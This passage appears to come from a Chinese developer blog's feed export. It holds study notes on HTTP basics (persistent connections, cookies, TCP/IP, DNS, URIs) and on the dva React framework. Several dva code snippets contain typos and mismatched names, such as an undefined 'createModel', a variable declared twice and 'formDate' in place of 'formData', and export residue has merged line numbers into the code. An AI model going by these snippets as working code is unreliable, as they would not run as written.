以当年的通信情况来说，因为都是些容量很小的文本传输，所以即使这样的也没有多大问题。可随着HTTP的普及，文档中包含着大量图片的情况多了起来。比如，使用浏览器浏览一个包含多张图片的HTML页面时，在发送请求访问HTML页面资源的同时，也会请求该HTML页面里包含的其他资源。因此，每次的请求都会造成无谓的TCP连接建立和断开，增加通信量的开销。 持久连接为了解决上述TCP连接的问题，HTTP/1.1和一部分的HTTP/1.0想出了持久连接（HTTP Persistent Connections,也称为HTTP keep-alive或HTTP connection reuse）的方法。持久连接的特点是，只要任意一端没有明确提出断开连接，则保持TCP连接状态。 持久连接旨在建立1次TCP连接后进行多次请求和响应的交互。持久连接的好处在于减少TCP连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。另外，减少开销的那部分时间，使得HTTP请求和响应能够更早地结束，这样Web页面的显示速度也就相应提高了。 在HTTP/1.1中，所有的连接默认都是持久连接，但在HTTP/1.0内并未标准化。虽然有一部分服务器通过非标准的手段实现了持久连接，但服务器端不一定能够支持持久连接。毫无疑问，除了服务器端，客户端也需要支持持久连接。 管线化持久连接使得多次请求以管线化（pipelining）方式发送成为可能。从前发送请求后需等待并收到响应，才能发送下一个请求。管线化技术出现后，不用等待响应亦可直接发送下一个请求。这样能够做到同时并行发送多个请求，而不需要一个接一个地等待响应了。 比如：当请求一个包含10张图片的HTML Web页面，与挨个连接相比，用持久连接可以让请求更快结束。而管线化技术则比持久连接还要快。请求次数越多，时间差就越明显。 使用 Cookie 的状态管理HTTP是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。 假设要求登录认证的Web页面本身无法进行状态的管理（不记录已登录的状态），那么每次跳转新页面不是再次登录，就是要在每次请求报文中附加参数来管理登录状态。 不可否认，无状态协议当然也有它的优点，由于不必保存状态，自然可减少服务器的CPU以及内存资源的消耗。从另一个侧面来说，也正是HTTP协议本身是非常简单的，所以才会被应用到各种场景里面。如果让服务器管理全部客户端状态会变成负担。 保留无状态这个特征的同时又要解决类似的矛盾问题，于是引入了Cookie技术。Cookie技术通过在请求和响应报文中写入了Cookie信息来控制客户端的状态。 Cookie会根据从服务端发送的响应报文内的一个叫做Set-Cookie的首部字段消息，通知客户端保存Cookie。当下次客户端再次往服务器发送请求时，客户端会自动在请求报文中加入Cookie后发出去。 服务器端发现客户端发送来的Cookie后，会去检查究竟是从哪一个客户端发送的连接请求，然后比对服务器端上的记录，最后得到之前的状态消息。 没有 Cookie消息状态下的请求 第 2 次以后（存有 Cookie 信息状态）的请求 上图展示了发生Cookie交互的情景，HTTP请求报文和响应报文的内容如下。 请求报文（没有Cookie消息的状态） 123GET / reader / HTTP/1.1Host: hark.jp*首部字段内没有Cookie相关消息 响应报文（服务器端生成Cookie消息） 1234HTTP/1.1 200 OKDate:Date: Thu, 12 Jul 2012 07:12:20 GMTServer: Apache＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMT＞Content-Type: text/plain; charset=UTF-8 请求报文（自动发送保存着的Cookie消息） 123GET /image/ HTTP/1.1Host: hackr.jpCookie: sid = 1342077140226724 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第一章）—— 了解Web网络基础]]></title>
    <url>%2F2018-08-09-read-%E5%9B%BE%E8%A7%A3HTTP-Part1.html</url>
    <content type="text"><![CDATA[近来在等待后台给接口，闲来无事重新回顾了http方面的知识，读大家津津乐道的《图解HTTP》，将其中大部分内容通过手打来加深印象。 第一章 了解Web网络基础使用HTTP协议访问Web你知道当我们在网页浏览器（Web browser）的地址栏中输入 URL时，Web 页面是如何呈现的吗？ Web 页面当然不能凭空显示出来。根据 Web 浏览器地址栏中指定的URL，Web 浏览器从 Web 服务器端获取文件资源（resource）等信息，从而显示出 Web 页面。像这种通过发送请求获取服务器资源的 Web 浏览器等，都称为客户端（client）。 12345通过制定的访问地址获取（或上传）服务器资源（文件等信息） ————————— ------------------&gt; —————————— | 客户端 | | 服务器 | ————————— &lt;------------------ —————————— 使用HTTP协议的通信 Web 使用一种名为 HTTP（HyperText Transfer Protocol，超文本传输协议 1 ）的协议作为规范，完成从客户端到服务器端等一系列运作流。而协议是指规则的约定。可以说，Web 是建立在 HTTP 协议上通信的。 HTTP的诞生1989 年 3 月，互联网还只属于少数人。在这一互联网的黎明期，HTTP 诞生了。 CERN（欧洲核子研究组织）的蒂姆 • 伯纳斯 - 李（Tim BernersLee）博士提出了一种能让远隔两地的研究者们共享知识的设想。最初设想的基本理念是：借助多文档之间相互关联形成的超文本（HyperText），连成可相互参阅的 WWW（World Wide Web，万维网）。现在已提出了 3 项 WWW 构建技术，分别是：把 SGML（StandardGeneralized Markup Language，标准通用标记语言）作为页面的文本标记语言的 HTML（HyperText Markup Language，超文本标记语言）；作为文档传递协议的 HTTP ；指定文档所在地址的 URL（Uniform12Resource Locator，统一资源定位符）。WWW 这一称，是 Web 浏览器当年用来浏览超文本的客户端应用程序时的名称。现在则用来表示这一系列的集合，也可简称为 Web。 Web 成长时代1990 年 11 月，CERN 成功研发了世界上第一台 Web 服务器和 Web 浏览器。两年后的 1992 年 9 月，日本第一个网站的主页上线了。日本第一个主页 http://www.ibarakiken.gr.jp/www/ 1990 年，大家针对 HTML 1.0 草案进行了讨论，因 HTML 1.0 中存在多处模糊不清的部分，草案被直接废弃了。HTML1.0 http://www.w3.org/MarkUp/draft-ietf-iiir-html-01.txt 1993 年 1 月，现代浏览器的祖先 NCSA（National Center forSupercomputer Applications，美国国家超级计算机应用中心）研发的Mosaic 问世了。它以 in-line（内联）等形式显示 HTML 的图像，在图像方面出色的表现使它迅速在世界范围内流行开来。同年秋天，Mosaic 的 Windows 版和 Macintosh 版面世。使用 CGI 技术的 NCSA Web 服务器、NCSA HTTPd 1.0 也差不多是在这个时期出现的。 NCSA Mosaic bounce pagehttp://archive.ncsa.illinois.edu/mosaic.html The NCSA HTTPd Home Page（存档）http://web.archive.org/web/20090426182129/http://hoohoo.ncsa.illinois.edu/（原址已失效） 1994 年 的 12 月，网景通信公司发布了 Netscape Navigator 1.0，1995年微软公司发布 Internet Explorer 1.0 和 2.0。 紧随其后的是现在已然成为 Web 服务器标准之一的 Apache，当时它以 Apache 0.2 的姿态出现在世人眼前。而 HTML 也发布了 2.0 版本。那一年，Web 技术的发展突飞猛进。Internet Explorer 浏览器的版本从 6 升到 7 前后花费了 5 年时间。之后接连不断地发布了 8、9、10 版本。另外，Chrome、Opera、Safari 等浏览器也纷纷抢占市场份额。 网络基础 TCP/IP通常使用的网络（包括互联网）是在 TCP/IP 协议族的基础上运作的。而 HTTP 属于它内部的一个子集。 TCP/IP 协议族计算机与网络设备要相互通信，双方就必须基于相同的方法。比如，如何探测到通信目标、由哪一边先发起通信、使用哪种语言进行通信、怎样结束通信等规则都需要事先确定。不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议（protocol）。 常见的协议有IEEE 802.3、FDD1、HTTP、SNMP、UDP、DNS、IP等等，统称为TCP/IP。 TCP/IP 的分层管理TCP/IP协议族最重要的一点就是分层。TCP/IP协议族按层次分别分为以下4层：应用层、传输层、网络层和数据链层。 把TCP/IP层次化是有好处。比如，如果互联网只有一个协议统筹，某个地方需要设计时，就必须把所有部分整体替换掉。而分层之后只需要把变化的层替换就好了。把各层之间的接口规范好之后，每个层次内部的设计就能够自由改动了。 值得一提的是，层次化之后，设计就变得简单了。处于应用层上的应用可以考虑分派自己的任务，而不需要弄清对方在地球上哪个地方、对方的传输路线是怎么样的、是否能够确保传输送达等问题。 TCP/IP协议族各层的作用如下。 应用层应用层决定了向用户提供应用服务通信的活动 TCP/IP协议族内预存了各类通用的应用服务。比如，FTP(File Transfer Protocol,文件传输协议)和 DNS(Domain Name System,域名系统)服务就是其中两类。 HTTP协议也处于该层 传输层传输层对上应用层，提供网络连接中的两台计算机之间的数据传输。在传输层有两个性质不同的协议：TCP（Transmission Control Protocol，传输控制协议）和UDP(User Date Protocol，用户数据抱协议) 网络层（有名网络互连层）网络层用来处理在网络上流动的数据包。数据包是网络传输的最小数据单位。该层规定了通过怎么样的路径（所谓的传输路线）到达对方计算机，并把数据包传给对方。 与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线。 链路层（又名为数据链路层，网络接口层）用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等无力可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。 TCP/IP 通信传输流 利用TCP/IP协议族进行网络通信时，会通过顺序与对方进行通信。发送端从应用层往下走。接收端则往应用层往上走。我们用HTTP举例来说明，首先作为发送端的客户端在应用层（HTTP协议）发出一个想看某个Web页面的HTTP请求。 接着为了传输的方便，在传输层（TCP协议）把从应用层收到的数据（HTTP请求报文）进行分割，并在各个报文打上标记序号及端口号后转发网络层。 在网络层（IP协议），增加作为通信目的地的MAC地址后转发给链路层。这样一来，发往网络的通信请求就准备齐全了。 接受端的服务器在链路层接受到数据，按序往上层发送，一直到应用层。当传输到应用层，才能算真正接受到由客户算发送过来的HTTP请求。 发送端在层与层之间传输数据时，每经过一层时必定会被打上一个该层所属的首部信息。反之，接收端在层与层传输数据时，每经过一层时就会把对应的首部消去。 这种把数据消息包装起来的做法称为封装（encapsulate） 与 HTTP 关系密切的协议 : IP、TCP 和 DNS负责传输的 IP 协议按层次分，IP（Internet Protocol）网际协议位于网络层。 Internet Protocol这个名词可能听起来有点夸张，但事实正是如此，因为几乎所有使用网络的系统都会用到IP协议。TCP/IP协议族中的IP指的就是网际协议，协议名称中占据了一半的位置，其重要性可见一斑。可能有人会把“IP”和“IP地址”搞混，“IP”其实是一种协议的名称。 IP协议的作用就是把各种数据包传送给对方。而要保证确实传送到对方那里，则需要满足各种各类条件。其中两个重要的条件就是IP地址和MAC地址（Media Access Control Address）。 IP地址指明了节点被分配到的地址，MAC地址是指网卡所属的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，但MAX地址基本上不会更改。 使用ARP协议凭借MAC地址进行通信 IP间的通信依赖MAC地址。在网络上，通信的双方在同一个局域网（LAN）内的情况是很少见的，通常是经过多台计算机和网络设备中转才能连接到对方。而在进行中转时，会利用下一站中转设备的MAC地址来搜索下一个中转目标。这时，会采用ARP（Address Resolution Protocol）。ARP是一种用以解析地址的协议，根据通信方的IP地址就可以反查出对应的MAC地址。 没有人能够全面掌握互联网中的传输状况 在到达通信目标前的中转过程中，那些计算机和路由器等网络设备只能获悉很粗略的传输路线。这种机制称为路由选择(routing),有点像快递公司的送货过程。想要寄快递的人，只要将自己的货物送到集散中心，就可以知道快递公司是否肯收件发货，该快递公司的集散中心检测货物的送达地址，明确下站该送往哪个区域的集散中心。接着，那个区域的集散中心自会判断是否能送到地方的家中。通过这个比喻说明了，无论哪台计算机、哪台网络设备，它们都无法全面掌握互联网中的细节。 确保可靠性的 TCP 协议按层次分，TCP位于传输层，提供可靠的字节流服务。 所谓的字节流服务（Byte Stream Service）是指，为了方便传输，将大块数据分割成以报文段（segment）为单位的数据包进行管理。而可靠的传输服务是指，能够把数据准确可靠地传给对方。一言而蔽之，TCP协议为了更容易传达大数据才把数据分割，而且TCP协议能够确认数据最终是否送达到对方。 确保数据能够到达目标 为了准确无误地将数据送达到目标处，TCP协议采用了三次握手（three-way-handshaking）策略。用TCP协议把数据包送出去后，TCP不会传送后的情况置之不理，它一定回想对方确认是否成功送达。 握手过程中使用了TCP的标志（flag）——SYN（synchronize）和ACK（acknowledgement）。 发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认消息。最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。 若在握手的过程中某个阶段莫名中断，TCP协议会再次以相同顺序发送相同的数据包 除了上述三个握手，TCP协议还有其他各种手段来保证通信的可靠性 负责域名解析的 DNS 服务DNS（Domain Name System）服务是和HTTP协议一样位于应用层的协议。它提供域名到IP地址之间的解析服务。 计算机即可以被赋予IP地址，也可以被赋予主机名和域名，比如 http://laibh.top 用户通常使用主机名或域名来访问对方的计算机，而不是直接通过IP地址来访问。因为与IP地址的一组纯数字相比，用字母配合数字的表示形式来指定计算机名更符合人类的记忆习惯。但要让计算机去理解名称，相对而言就变得困难。因为计算机更擅长处理一长串数字。 为了解决上述的问题，DNS服务应运而生。DNS协议提供通过域名查找IP地址，或逆向从IP地址反查域名的服务。 各种协议与 HTTP 协议的关系学习了和 HTTP 协议密不可分的 TCP/IP 协议族中的各种协议后，我们再通过这张图来了解下 IP 协议、TCP 协议和 DNS 服务在使用HTTP 协议的通信过程中各自发挥了哪些作用。 URI 和 URL与URI（统一资源标识符）相比，我们更熟悉URL（Uniform Resource Locator, 统一资源定位符）。URL正是使用Web浏览器等访问Web需要输入的网络地址。 统一资源标识符URI 是 Uniform Rescource Identifier 的缩写。RFC2396分别对这三个单词进行了如下定义 Uniform规定统一的格式可方便处理多种不同类型的资源，而不用根据上下文环境来识别资源指定的访问方式。另外，加入新增的协议方案（如http:或ftp:）也更容易 Resource资源的定义是“可以标识的任何东西”。除了文档文件、图像或服务（例如当天的天气预报）等能够区别于其他类型的，全都可作为资源。另外资源不仅是单一的，也可以是多数的集合体。 Identifier表示可以标志的对象，也可以成为标识符。 综上所述，URI就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型名称。 采用HTTP协议时，协议方案就是http.除此之外，还有ftp、mailto、telnet、file等。标准的URI协议方案有30种左右，由隶属于国际互联网资源管理的非营利社团ICANN(Internet Corporation for Assigned Names and Numbers,互利网名称与数字地址分配机构)的IANA（Internet Assigned Numbers Authority,互利网号码分配局）的管理颁布。 URI 用字符串标识某一互联网资源，而 URL 表示资源的地点（互联网上所处的位置）。可见 URL 是 URI 的子集。“RFC3986：统一资源标识符（URI）通用语法”中列举了几种 URI 例子，如下所示。 12345678ftp://ftp.is.co.za/rfc/rfc1808.txthttp://www.ietf.org/rfc/rfc2396.txtldap://[2001:db8::7]/c=GB?objectClass?onemailto:John.Doe@example.comnews:comp.infosystems.www.servers.unixtel:+1-816-555-1212telnet://192.0.2.16:80/urn:oasis:names:specification:docbook:dtd:xml:4.1.2 在充分理解的基础上，也可用 URL 替换 URI。 URI 格式表示指定的URI，要使用涵盖全部必要信息的决定URI、绝对URL以及相对URL。相对URL，是指从浏览器中基本URI处指定的URL，形如 /image/logo.gif。让我们先来了解一下绝对 URI 的格式。 使用http:或http:等协议方案名获取访问资源时要指定协议类型。不要区分字母大小写，最后附一个冒号（：）. 也可以使用data:或javascript:这类指定数据或脚本程序的方案名。 登录信息（认证） 指定用户名和密码作为从服务器端获取资源时必要的登录消息（身份认证）。此项是可选项。 服务器地址 使用绝对URI必须指定待访问的服务器地址。地址可以是类似laibh.top这种DNS可解析的名称，或者192.168.1.1这类IPv4地址名，还可以是[0:0:0:0:0:0:0:1]这种用方括号括起来的IPv6地址名。 服务器端口号 指定服务器连接的网络端口。此项也是可选项，若用户忽略则自动使用默认端口号 带层次的文件路径 指定服务器上的文件路径来定位特指的资源。这与UNIX系统的文件目录结构相似 查询字符串 针对已指定的文件路径内的资源，可以使用查询字符串传入任意参数。此项可选。 片段标识符 使用片段标识符通常可标记出已获取资源的子资源（文档内的某个位置）。但在RFC中并没有明确规定其使用方法。该项也为可选项 并不是所有的应用程序都符合 RFC有一些用来制定 HTTP 协议技术标准的文档，它们被称为RFC（Request for Comments，征求修正意见书）。通常，应用程序会遵照由 RFC 确定的标准实现。可以说，RFC 是互联网的设计文档，要是不按照 RFC 标准执行，就有可能导致无法通信的状况。比如，有一台 Web 服务器内的应用服务没有遵照RFC 的标准实现，那 Web 浏览器就很可能无法访问这台服务器了。由于不遵照 RFC 标准实现就无法进行 HTTP 协议通信，所以基本上客户端和服务器端都会以 RFC 为标准来实现 HTTP 协议。但也存在某些应用程序因客户端或服务器端的不同，而未遵照 RFC 标准，反而将自成一套的“标准”扩展的情况。不按 RFC 标准来实现，当然也不必劳心费力让自己的“标准”符合其他所有的客户端和服务器端。但设想一下，如果这款应用程序的使用者非常多，那会发生什么情况？不难想象，其他的客户端或服务器端必然都不得不去配合它。实际在互联网上，已经实现了 HTTP 协议的一些服务器端和客户端里就存在上述情况。说不定它们会与本书介绍的 HTTP 协议的实现情况不一样。本书接下来要介绍的 HTTP 协议内容，除去部分例外，基本上都以RFC 的标准为准。 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dva 学习笔记 (下)]]></title>
    <url>%2F2018-07-09-learn-dva-Part3.html</url>
    <content type="text"><![CDATA[dva 学习笔记dva 学习笔记 代码 使用 Dva 开发复杂 SPA动态加载 model利用 webpack 的 require.ensure 来实现 model 的动态加载 123456789101112131415161718192021222324252627function RouterConfig(&#123; history, app&#125;) &#123; const routes = [ &#123; path: &apos;/&apos;, name: &apos;IndexPage&apos;, getComponent(nextState, cb) &#123; require.ensure( [], (require) =&gt; &#123; registerModel(app,require(&apos;./models/dashboard&apos;)); cb(null, require(&apos;./routers/IndexPage&apos;)); &#125;) &#125; &#125;, &#123; path:&apos;/users&apos;, name:&apos;UsersPage&apos;, getComponent(nextState, cb) &#123; require.ensure(nextState, cb) &#123; require.ensure( [],(require) =&gt;&#123; registerModel(app, require(&apos;./models/users&apos;)); cb(null, require(&apos;./routes/Users&apos;)) &#125;) &#125; &#125; &#125; ]; return &lt;Router history = &#123; history &#125; routes = &#123; routes &#125; /&gt;;&#125; 这样，在视图切换到这个路由的时候，对应的 model 就会被加载。同理，也可以做 model 的动态移除，不过，一般情况下是不需要移除的 使用 model 共享全局信息model 可以动态加载，也可以移除。从这个角度看，model 是可以有不同生命周期的，有些可以与功能视图伴随，而有些可以贯穿整个应用的生命周期。 从业务逻辑看，不少场景是可以做全局的 model ，例如我们在路由之间的前进后退， model 可以用于在路由间共享数据，比较典型的，像列表页和详情页的互相转换，可以用同一份 model 去共享他们的数据 注意，如果当前应用中记载了不止一个 model ，在其中一个 effect 里做 select 操作，是可以获取另外一个 state的 123*foo(action, &#123; select &#125;) &#123; const &#123; a, b&#125; = yield select();&#125; model 的复用有时候，业务上可能会遇到期望把一些外部关联比较少的 model 拆出来的需求，可能会拆出来一个 model ，然后用不同的视图容器去 connect 它 123456export default &#123; namespace: &apos;reusable&apos;, state: &#123;&#125;, reducers: &#123;&#125;, effrcts: &#123;&#125;&#125; 所以，在业务上，可能出现的使用情况就是： 12345 ContainerA &lt;-- ModelA | ------------------------------ | |ContainerB &lt;-- reusable ContainerC &lt;-- reusable 这里面，ContainerB 和 ContainerC 是 ContainerA 的下属，它们的逻辑结构一致，只是展现不同。我们可以让它们分别 connect 同一个 model ，注意，这个时候，model 的修改会同时影响到两个视图，因为 model 在 state 中是直接以 namespace 作 key 存放的，实际上只有一份实例 动态扩展 model可能会遇到的业务逻辑： 几个业务视图长得差不多， model 也存在少量的差别 在这种情况下可以复用同一个 model ，但这么做，对于维护是一种挑战，很可能改变其中一个，对另外一个造成了影响，所以在这种情况下，扩展是比较好的选择 扩展要做的事情：新增一些东西覆盖一些原来的东西根据条件动态创建一些东西 dva 中的每个 model ，实际上都是普通的 JavaScript 对象，包含 namespacestatereducerseffectssubscription 从这个角度上看，我们要新增或者覆盖的一些东西，都会比较容易。比如使用 Object.assign 来进行对象的复制属性，就可以把新的内容添加或者覆盖到原有的对象上。 注意这里有两级，model 结构中的 state，reducers，effects，subscriptions都是对象结构，需要分别在这一级去做 assign。 1234567891011121314151617function reacteModel(options) &#123; const &#123; namespace, param &#125; = options; return &#123; namespace: `demo$&#123;namespace&#125;`, states: &#123;&#125;, reducers: &#123;&#125;, effects: &#123; *foo() &#123; // 这里可以根据param来确定下面这个call的参数 yield call() &#125; &#125; &#125;&#125;const modelA = createModel(&#123; namespace: &apos;A&apos;, param :&#123; type: &apos;A&apos;&#125;&#125;);const modelA = createModel(&#123; namespace: &apos;B&apos;, param :&#123; type: &apos;B&apos;&#125;&#125;); 长流程的业务逻辑例如复杂的表单提交，中间会需要去发起多种对视图状态的操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455*submit(action, &#123;put,call,select&#125;) &#123; const formData = yield select(state =&gt; &#123; const buyModel = state.buy; const context = state.context; const &#123; stock &#125; = buyModel; return &#123; uuid: context.uuid, market: stock &amp;&amp; stock.code, stockName: stock &amp;&amp; stock.name, price: String(buyModel.price), //委托数量 entrustAmount: String(buyModel.count), totalBalance: buyModel.totalBalance, availableTzbBanlance: buyModel.availableTzbBalance, availableDepositBalance: buyModel.availableDepositBalance, &#125; &#125;); const result = yield call(post, &apos;/h5/entrust_buy&apos;,formDate, &#123;loading: true&#125;); if(result.success)&#123; toast(&#123; type: &apos;success&apos;, content: &apos;委托已受理&apos;, &#125;); // 成功之后再获取一次现价，并填入 // yield put(&#123;type: &apos;fetchQuotation&apos;, payload: stock&#125;); yield put(&#123; type: &apos;entrustNoChange&apos;, payload: result.result &amp;&amp; result.result.entrustNo &#125;); // 清空输入框内容 yield put(&#123; type: &apos;searchQueryChange&apos;, value: &apos;&apos; &#125;); // 403时，需要验证密码再重新提交 if (!result.success &amp;&amp; result.resultCode === 403) &#123; yield put(&#123; type: &apos;checkPassword&apos;, payload: &#123;&#125; &#125;); return; &#125; // 失败之后也需要更新投资宝和保证金金额 if (result.result) &#123; yield put(&#123; type: &apos;balanceChange&apos;, payload: result.result &#125;); &#125; // 重新获取最新可撤单列表 yield put(&#123; type: &apos;fetchRevockList&apos; &#125;); // 返回的结果里面如果有uuid, 用新的uuid替换 if (result.uuid) &#123; yield put(&#123; type: &apos;context/updateUuid&apos;, payload: result.uuid &#125;); &#125; &#125;&#125; 在一个 effect 中可以使用多个 put 来分别调用 reducer 来更新状态存在另外一些流程，在 effect 中可能会存在多个异步的服务调用，比如说，要调用一次服务端的验证，成功之后再去提交数据，这时候在一个 effect 中就会存在多个 call 操作了 使用 take 操作进行事件监听一个流程的变动，需要扩散到若干其他 model 中，在 redux-sage 中提供了 take 和 takeLatest 这两个操作， dva 是 redux-saga 的封装，也是可以用这种操作 假设我们有一个事件处理的代码 someSource.on( ‘click’, event =&gt; doSomething(event)) 这段代码转成 generator 来表达，就是下面的这个形式 123456function* sage() &#123; while(true) &#123; const event = yield take(&apos;click&apos;); doSomething(event) &#125;&#125; 我们 可以在 dva 中使用 take 操作来监听 action 多任务调度上述大多都是串行执行方式，这是业务中最常见的多任务执行方式，只需逐个 yield call 就可以了 有时候我们可能希望多个任务以外一些方式执行 并行： 若干个任务之间不存在依赖关系，并且后续操作对它们的结果无依赖竞争： 若干个任务之间，只要有一个执行完成，就进入下一个环节子任务： 若干个任务，并行执行，但必须全部做完之后，下一个环节才继续执行 任务的并执行可以通过以下方式 1234const [result1, result2] = yield [ call(service1, param1), call(service2, param2)] 把多个要并行执行的东西放在一个数组里，就可以并行执行，等所有的都结束后进行下一个环节，类似 promise.all 操作，一般有些集成界面，比如 dashboard ，其中各组件之间业务的管理较小，就可以用这种方式去分别加载数据，此时，整体加载时间只取决于时间最长的那个 如果把 yield [] 误写成 yield* [] 就会顺序执行 任务的竞争多任务的竞争关系，可以通过以下方式 12345678910const &#123; data, timeout &#125; = yield race(&#123; data: call(server, &apos;some data&apos;), timeout: call(delay, 1000)&#125;);if(data)&#123; put(&#123; type:&apos;DATA_RECEIVED&apos;, data&#125;);&#125;else&#123; put(&#123; type:&apos;TIMEOUT_ERROR&apos;&#125;);&#125; 跨 model 的通信在业务复杂的情况下，我们可能会对 model 进行拆分，往往又会遇到一些比较复杂的事情 一个流程贯穿整个 model 父容器A，子容器B，二者各自 connect 了不同的 model A 和 B父容器中有一个操作，分三个步骤：model A 中某个 effect 处理第一步call model B 中的某个 effect 去处理第二步第二步结束后，再返回 model A 中做第三步在 dva 中，可以用 namespace 去指定接受 action 的 `model ，所以可以通过类似这样的方式去组合： 123yield call(&#123; type: &apos;a/foo&apos; &#125;);yield call(&#123; type: &apos;b/foo&apos; &#125;);yield call(&#123; type: &apos;a/bar&apos; &#125;); 甚至，还可以利用 take 命令，在另外一个 model 的某个 effect 中插入逻辑： 1234567*effectA() &#123; yield call(service1); yield put(&#123; type: &apos;service1Success&apos; &#125;); // 如果我们复用这个effect，但要在这里加一件事，怎么办？ yield call(service2); yield put(&#123; type: &apos;service2Success&apos; &#125;);&#125; 可以利用之前我们说的 take 命令： yield take(‘a/service1Success’); 这样，可以在外部往里面添加一个并行操作，通过这样的组合可以处理一些组合流程。但实际情况下，我们可能要处理的不仅仅是 effect ，很可能视图组件中还存在后续逻辑，在某个 action 执行之后，还需要再做某些事情。 比如： 123yield call(&#123; type: &apos;a/foo&apos; &#125;);yield call(&#123; type: &apos;b/foo&apos; &#125;);// 如果这里是要在组件里面做某些事情，怎么办？ 可以利用一些特殊手段把流程延伸出来到组件里。比如说，我们通常在组件中 dispatch 一个 action 的时候，不会处理后续事情，但可以修改这个过程： 123456new Promise((resolve, reject) =&gt; &#123; dispatch(&#123; type: &apos;reusable/addLog&apos;, payload: &#123; data: 9527, resolve, reject &#125; &#125;);&#125;).then((data) =&gt; &#123; console.log(`after a long time, $&#123;data&#125; returns`);&#125;); 注意这里，我们是把 resolve 和 reject 传到 action 里面了，所以，只需在 effect 里面这样处理： 123456789try &#123; const result = yield call(service1); yield put(&#123; type: &apos;service1Success&apos;, payload: result &#125;); resolve(result);&#125;catch (error) &#123; yield put(&#123; type: &apos;service1Fail&apos;, error &#125;); reject(ex);&#125; 这样，就实现了跨越组件、模型的复杂的长流程的调用。]]></content>
      <categories>
        <category>react相关</category>
      </categories>
      <tags>
        <tag>dva</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dva 学习笔记 (中)]]></title>
    <url>%2F2018-07-09-learn-dva-part2.html</url>
    <content type="text"><![CDATA[dva 学习笔记dva 学习笔记 代码 3.入门课React 没有有解决的问题React 本身只是一个 DOM 的抽象层，使用组件构建虚拟 DOM开发大应用要解决的问题通信：组件之间如何通信数据流：数据如何和视图串联起来？ 路由和数据如何绑定？ 如何编写异步逻辑？ 通信问题组件会发生三种通信想子组件发消息向父组件发消息向其他组件发消息 React 只提供了一种通信手段：传参 组件通信的例子step 1父组件拿到子组件的值 1234567891011121314class Son extends React.Component &#123; render()&#123; return &lt;input /&gt;; &#125;&#125;class Father extends React.Compoent &#123; render() &#123; return &lt;div&gt; &lt;Son /&gt; &lt;p&gt; 这里显示 Son 组件的内容 &lt;/div&gt;； &#125;&#125;ReactDOM.render(&lt;Father&gt;,mountNode); step 2子组件通过父组件传入的函数，将自己的值再传回父组件 12345678910111213141516171819202122class Son extends React.Component &#123; render() &#123; return &lt;input onChange = &#123; this.props.onChange &#125;&gt;&#125;class Father extends React.Component &#123; constructor() &#123; super(); this.state = &#123; son: &quot;&quot; &#125; this.changeHandler = this.changeHandler.bind(this); &#125; changeHandler(e)&#123; this.SetState(&#123; son: e.target.value &#125;); &#125; render() &#123; return &lt;div&gt; &lt;Son onChange = &#123; changeHandler &#125;&gt; &lt;p&gt;这里展示 Son 组件的内容 &#123; this.state.son &#125;&lt;/p&gt; &lt;/div&gt; &#125;&#125; 数据流问题数据流方案Flux ，单项数据流方案， Redux 为代表Reactive ,响应式数据流方案 Mobx 为代表 流行的数据流方案路由： React-Router架构： Redux异步操作： Readux-saga缺点：引入多个库，项目结构复杂 dva 是什么dva 是体验技术部开发的 React 应用框架，将上面三个 React 工具库包装在一起，简化了 API ,让开发 React 应用更加快捷和方便`dva = React-Router + Redux + Readux -saga dva 应用的最简结构1234567891011import dva from &apos;dva&apos;;const App = () =&gt; &lt;div&gt; Hello dva&lt;/div&gt;;//创建应用const app = dva();//注册视图app.router( () =&gt; &lt;App/&gt;)//启动应用app.start(&apos;#root&apos;); 数据流图State ===(connect)== View ==(dispatch)== Action == State State : 一个对象，保存这个应用状态View : React 组件构成的视图层Action : 一个对象，描述事件connect方法 : 一个函数，绑定 State 到 Viewdispatch 方法 : 一个函数，发送 Action 到 State State 和 viewState 是存储数据的地方，收到 Action 后，就会更新数据View 是 React 组件构成的 UI 层，从 State 获取到数据后，就渲染成 HTML 代码。只要 State 有变化， View 就会自动更新 ActionAction 是用来描述 UI 层事件的一个对象 { type:’click-submit-button’, payload: this.form.data } connect 方法connect 是一个函数，绑定 State 到 View 123456import &#123; connect &#125; from &apos;dva&apos;function mapStateToProps(state) &#123; return &#123; todos: state.todos &#125;;&#125;connect(mapStateToProps)(App); connect 方法返回的也是一个 React 组件，通常称为容器组件，因为它是原始的 UI 组件的容器，即在外面包了一层 Stateconnect 方法传入的第一个参数是 mapStateToProps 函数， mapStateToprops 函数会返回一个对象，用于建立 State 到 Props 的映射关系 dispatch 方法dispatch 是一个函数方法，用来将 Action 发送给 State 1dispatch(&#123; type:&apos;click-submit&apos;, payload: this.form.data &#125;) 被 connect 的 Component 会自动在 props 中拥有 dispatch 方法 dva 应用的最简结构（带 model）1234567891011121314151617181920212223// 创建应用const app = dva();// 注册 Modelapp.model(&#123; namespace: &apos;count&apos;, state: 0, reducers: &#123; add(state) &#123; return state + 1&#125;, &#125;, effects: &#123; *addAfterSecond(action, (call, put))&#123; yield call(delay,1000); yield put(&#123; type: &apos;add&apos;&#125;); &#125; &#125;&#125;);// 注册视图app.router( () =&gt; &lt;ConnectedApp /&gt;);// 启动应用app.start(&apos;#root&apos;); app.modeldva 提供 app.model 这个对象，所有应用逻辑都定义在它上面 1234567const app = dva();// 